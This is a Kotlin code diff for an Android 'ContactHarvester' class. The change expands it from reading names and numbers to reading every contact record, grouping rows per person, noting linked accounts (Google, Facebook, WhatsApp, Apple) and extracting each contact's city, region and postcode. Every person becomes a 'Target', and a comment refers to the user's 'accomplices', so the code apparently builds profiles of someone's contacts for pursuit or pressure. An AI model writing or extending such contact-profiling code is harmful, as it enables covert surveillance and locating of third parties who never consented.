@@ -13,14 +13,26 @@ import kotlinx.coroutines.withContext
 class ContactHarvester(private val contentResolver: ContentResolver) {
 
     suspend fun harvestContacts(): List<Target> = withContext(Dispatchers.IO) {
-        val targets = mutableListOf<Target>()
+        val contactDataMap = mutableMapOf<Long, ContactData>()
         val projection = arrayOf(
-            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
-            ContactsContract.CommonDataKinds.Phone.NUMBER
+            ContactsContract.Data.CONTACT_ID,
+            ContactsContract.Data.MIMETYPE,
+            ContactsContract.Data.DATA1, // Often the main data (number, email, street)
+            ContactsContract.Data.DATA2, // Often type
+            ContactsContract.Data.DATA3, // Often label
+            ContactsContract.Data.DATA4,
+            ContactsContract.Data.DATA5,
+            ContactsContract.Data.DATA6,
+            ContactsContract.Data.DATA7,
+            ContactsContract.Data.DATA8,
+            ContactsContract.Data.DATA9,
+            ContactsContract.Data.DATA10,
+            ContactsContract.Contacts.DISPLAY_NAME_PRIMARY,
+            ContactsContract.RawContacts.ACCOUNT_TYPE
         )
 
         val cursor: Cursor? = contentResolver.query(
-            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+            ContactsContract.Data.CONTENT_URI,
             projection,
             null,
             null,
@@ -28,35 +40,89 @@ class ContactHarvester(private val contentResolver: ContentResolver) {
         )
 
         cursor?.use {
-            val nameIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
-            val numberIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
+            val idIndex = it.getColumnIndex(ContactsContract.Data.CONTACT_ID)
+            val mimeTypeIndex = it.getColumnIndex(ContactsContract.Data.MIMETYPE)
+            val data1Index = it.getColumnIndex(ContactsContract.Data.DATA1)
+            val nameIndex = it.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME_PRIMARY)
+            val accountTypeIndex = it.getColumnIndex(ContactsContract.RawContacts.ACCOUNT_TYPE)
+            val data7Index = it.getColumnIndex(ContactsContract.Data.DATA7) // City
+            val data8Index = it.getColumnIndex(ContactsContract.Data.DATA8) // Region
+            val data9Index = it.getColumnIndex(ContactsContract.Data.DATA9) // Postcode
 
             while (it.moveToNext()) {
-                val name = it.getString(nameIndex) ?: continue
-                val number = it.getString(numberIndex) ?: continue
-                
-                val cleanNumber = number.filter { char -> char.isDigit() }
-                
-                // Naive extraction. Assuming the standard North American numbering plan for now.
-                // We'll have to get clever later if they have international accomplices.
-                val areaCode = if (cleanNumber.length >= 10) {
-                    cleanNumber.takeLast(10).take(3)
-                } else {
-                    "UNKNOWN"
+                val contactId = it.getLong(idIndex)
+                if (contactId <= 0) continue
+
+                val mimeType = it.getString(mimeTypeIndex)
+                val displayName = it.getString(nameIndex) ?: continue
+                val accountType = it.getString(accountTypeIndex)
+
+                val contactData = contactDataMap.getOrPut(contactId) { ContactData(displayName) }
+
+                if (accountType != null) {
+                    val mappedAccount = when {
+                        accountType.contains("google", ignoreCase = true) -> "Google"
+                        accountType.contains("facebook", ignoreCase = true) -> "Facebook"
+                        accountType.contains("whatsapp", ignoreCase = true) -> "WhatsApp"
+                        accountType.contains("apple", ignoreCase = true) -> "Apple"
+                        else -> "Device Contacts"
+                    }
+                    contactData.accounts.add(mappedAccount)
                 }
 
-                targets.add(
-                    Target(
-                        displayName = name,
-                        phoneNumber = number,
-                        areaCode = areaCode,
-                        sourceAccount = "Device Contacts"
-                    )
-                )
+                when (mimeType) {
+                    ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE -> {
+                        val number = it.getString(data1Index)
+                        if (number != null && contactData.phoneNumber == null) {
+                            contactData.phoneNumber = number
+                        }
+                    }
+                    ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE -> {
+                        val city = it.getString(data7Index)
+                        val region = it.getString(data8Index)
+                        val zip = it.getString(data9Index)
+
+                        val locationParts = listOfNotNull(city, region, zip).filter { part -> part.isNotBlank() }
+                        if (locationParts.isNotEmpty() && contactData.residenceInfo == null) {
+                            contactData.residenceInfo = locationParts.joinToString(", ")
+                        }
+                    }
+                }
             }
         }
         
+        val targets = contactDataMap.values.mapNotNull { data ->
+            val number = data.phoneNumber ?: return@mapNotNull null
+            val cleanNumber = number.filter { char -> char.isDigit() }
+            val areaCode = if (cleanNumber.length >= 10) {
+                cleanNumber.takeLast(10).take(3)
+            } else {
+                "UNKNOWN"
+            }
+
+            val sourceAccounts = if (data.accounts.isEmpty()) {
+                "Device Contacts"
+            } else {
+                data.accounts.joinToString(", ")
+            }
+
+            Target(
+                displayName = data.displayName,
+                phoneNumber = number,
+                areaCode = areaCode,
+                sourceAccount = sourceAccounts,
+                residenceInfo = data.residenceInfo
+            )
+        }
+
         targets.distinctBy { it.phoneNumber }
     }
+
+    private class ContactData(
+        val displayName: String,
+        var phoneNumber: String? = null,
+        var residenceInfo: String? = null,
+        val accounts: MutableSet<String> = mutableSetOf()
+    )
 }
 
